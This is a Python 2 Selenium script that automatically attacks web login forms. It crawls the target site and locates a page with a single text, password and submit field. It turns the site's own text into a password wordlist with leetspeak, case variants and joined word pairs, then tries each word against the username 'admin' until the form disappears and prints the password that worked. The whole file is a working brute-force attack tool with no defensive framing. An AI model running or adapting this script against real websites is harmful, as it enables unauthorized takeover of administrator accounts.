import unittest
from   selenium import webdriver
from   selenium.common.exceptions import TimeoutException
from nltk.corpus import stopwords
from nltk.tokenize import RegexpTokenizer
import itertools
import sys
import time

words=[]
finalList=[]
#desc_list=[]
desc_list1=[]
finalListLower=[]
finalString=""
finalListUpper=[]
links=[]
uniqueWords=[]
stop = stopwords.words('english')
found_url=None
username=None
password=None
submit=None
merged_list=[]
html_text=""
browser = webdriver.Firefox()
form_elements=[]

browser.implicitly_wait(3)
browser.set_page_load_timeout(10);


'''
function to take the URL as input and find the login page and
set the value of the login page in the found_url variable
'''

def find_links(url):
    global links
    #print url
    browser.get(url)
    alinks=browser.find_elements_by_tag_name('a')
    for x in alinks:
        if x.get_attribute('href') in links:
            pass
        else:
            links.append(str(x.get_attribute('href')))
     
def process_url(url):
    print url
    #global links
    global found_url, username, password, submit, html_text,form_elements
    text,passwd,button=None,None,None
    tc,pc,bc=0,0,0
    
    browser.get(url)
    #find all the text under body tag on the page
    html_text+=" "+browser.find_element_by_tag_name('body').text
    #alinks=browser.find_elements_by_tag_name('a')
    #finding all the links on the page and saving them in the links list
    #for x in alinks:
    #    links.append(str(x.get_attribute('href')))
    try:
        form_elements=browser.find_elements_by_xpath("//form/input")
        #print form_elements
        #print "----"
        for element in form_elements:
            if element.get_attribute("type")=="text":
                #print "*****"
                tc+=1
            if element.get_attribute("type")=="password":
                pc+=1
            if element.get_attribute("type")=="submit":
                bc+=1

        #print str(tc)+"-->"+str(bc)+"--->"+str(pc) 
        if tc==1 and bc==1 and pc==1:
            found_url=url
            #print "found form on url :"+found_url
        else:
            #print "no form"
            pass
    except Exception as e:
        #print "Exception occured"
        pass
    #print "====================>>>>"+str(found_url)
    



'''
function to submit the form with username="admin and password from the list
of unique words. Function also check if the login is successful or not.
If not it continues the process else it break where it find the successful login.
For successful login:
1. it check if the URL has changed
2. then if the form elements are still present or not
3. and if some indicative text like wrong or invalid password present or not
'''
def submit_form():
    global found_url,uniqueWords
    #incorrect_word_list=["wrong","Wrong","Incorrect","incorrect","Invalid","invalid"]
    text=None
    passwd=None
    button=None
    form_url=found_url
    #print form_url
    #print form_url
    browser.get(form_url)
    '''try:
        text = browser.find_element_by_xpath("//form/input[@type='text']")
        passwd = browser.find_element_by_id("//form/input[@type='password']")
        button   = browser.find_element_by_id("//form/input[@type='button']")
    except Exception as e:
        print "exception"
        pass
    '''
    
    
    for i in uniqueWords:
        #print i
        #time.sleep(2)
        text = browser.find_element_by_xpath("//input[@type='text']")
        #print text
        passwd=browser.find_element_by_xpath("//input[@type='password']")
        button=browser.find_element_by_xpath("//input[@type='submit']")
        text.clear()
        passwd.clear()
        text.send_keys("admin")
        #print "-->"+i
        #passwd=browser.find_element_by_xpath("//form/input[@type='password']")
        #button=browser.find_element_by_id("//form/input[@type='button']")
        
        passwd.send_keys(i)
        
        button.click()
        

        time.sleep(2)

        #print browser.current_url
        #print form_url
        #print browser.current_url!=form_url
        #print text.size
        #print passwd.size
        #print button.size
        try:
            
            if browser.find_element_by_xpath("//input[@type='text']") and browser.find_element_by_xpath("//input[@type='password']") \
            and browser.find_element_by_xpath("//input[@type='submit']"):
                #print "inside"
                pass
            #else:
            #    #print "login succeeded"
            #    #sys.exit(0)
            #form success
        except Exception as e:
            #print "Execption :"+e
            print "form url found on : "+form_url
            print "login succeeded with password : "+i
            sys.exit(0)
        browser.get(form_url)
        
    
    
    
    

'''
function to convert the plain html text into list of words
list will have also have uppercase,lowercase and leet speak of the words
'''
def get_list_of_words(html_text):
    global desc_list1,merged_list
    #spcl_str=".,:;"
    desc_list=[]
    bigram_list=[]
    tokenizer = RegexpTokenizer(r'\w+')
    desc_list=tokenizer.tokenize(html_text)
    #print desc_list
    
    new_list=[]
    #desc_list=html_text.split()
    for x in desc_list:
        #for char in spcl_str:
        #    x=x.replace(char,"")
        #print x
        #print x
        desc_list1.append(str(x))
        #print len(desc_list1)
        #print desc_list1
        #function call to toLeet
        desc_list1.append(toLeet(str(x)))
        #print len(desc_list1)
        #print desc_list1
        desc_list1.append(str(x).lower())
        #print len(desc_list1)

        #print desc_list1
        desc_list1.append(str(x).upper())
        #print len(desc_list1)
        #print desc_list1

    #print desc_list1
    #print len(desc_list1)
    bigram_list=list(itertools.permutations(desc_list1, 2))
    #print bigram_list
    #print len(bigram_list)
    
    for i,j in bigram_list:
        #print "--->"+i
        #print "****"+j

        x=i+j
        new_list.append(x)
    #print new_list
    #print "----------------------------------------------"
    merged_list=[i for i in itertools.chain(desc_list1, new_list)]
    #print merged_list
    
    
'''    
def bigramList():
    global desc_list1
    bigram_list=[]
    bigram_list=list(itertools.permutations(desc_list1, 2))
    desc_list1=desc_list1+bigram_list
'''

'''
function to remove stop words from the sentences present in the
nltk.corpus for enlish language.
'''        
def remove_stop_words():
    global words
    for i in merged_list:
        if i not in stop:
            words.append(i)    



'''
function to form the basic leet speak of words using tuples ot tuples and
mapping each alphabet to its leetspeak.
'''
def toLeet(text):
	leet = (
                (('are', 'Are'), 'r'),
                (('ate', 'Ate'), '8'),
                (('that', 'That'), 'tht'),
		(('you', 'You'), 'u'),
		(('o', 'O'), '0'),
		(('i', 'I'), '1'),
		(('e', 'E'), '3'),
		(('s', 'S'), '5'),
		(('a', 'A'), '4'),
		(('t', 'T'), '7'),
                (('Z','z'), 'z'),
                (('B','b'),"b"),
                (('C','c'),"c"),
                (('D','d'),"d"),
                (('F','f'),"f"),
                (('G','g'),"6"),
                (('H','h'),"h"),
                (('J','j'),"j"),
                (('K','k'),"k"),
                (('L','l'),"l"),
                (('M','m'),"m"),
                (('N','n'),"n"),
                (('P','p'),"p"),
                (('Q','q'),"q"),
                (('R','r'),"r"),
                (('U','u'),"u"),
                (('V','v'),"v"),
                (('W','w'),"w"),
                (('X','x'),'x'),
                (('y','Y'),"y"),
                (('_'), " "),
                )

        for symbols, replaceStr in leet:
		for symbol in symbols:
			text = text.replace(symbol, replaceStr)
	return text



#
#program execution starts here
#
def main():
    global uniqueWords, found_url,words, html_text, links
    #check if the correct number of arguments are passed
    if len(sys.argv) == 1:
        print "Usage: %s URL [URL]..." % sys.argv[0]
        sys.exit(1)
    # else, if at least one parameter was passed
    for url in sys.argv[1:]:
        #process_url(url)
        find_links(url)
    #print links
    for url in links:
        #process_url(link)
        find_links(url)

    link_set=set(links)
    #print link_set
    for url in link_set:
        process_url(url)
    #function call to get_list_of_words
    get_list_of_words(html_text)
    #print html_text
    #function call remove_stop_words
    remove_stop_words()
    #keeping set of words once like unique set of words
    myset=set(words)
    for x in myset:
        uniqueWords.append(str(x))
    #print uniqueWords
    #function call to submit_form()
    submit_form()


#############################################################################

if __name__ == "__main__":
    main()






